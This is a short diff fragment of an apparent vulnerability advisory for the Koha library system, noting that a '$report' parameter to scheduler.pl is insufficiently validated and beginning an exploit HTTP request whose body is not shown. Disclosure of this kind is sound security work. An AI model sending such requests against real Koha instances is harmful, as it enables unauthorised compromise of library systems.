@@ -34,7 +34,7 @@ The `$report` variable comes from user input and undergoes insufficient validati
 
 The following HTTP request can be used to exploit the vulnerability:
 
-```
+```http
 POST /cgi-bin/koha/tools/scheduler.pl HTTP/1.1
 Host: [koha-instance]
 Content-Type: application/x-www-form-urlencoded
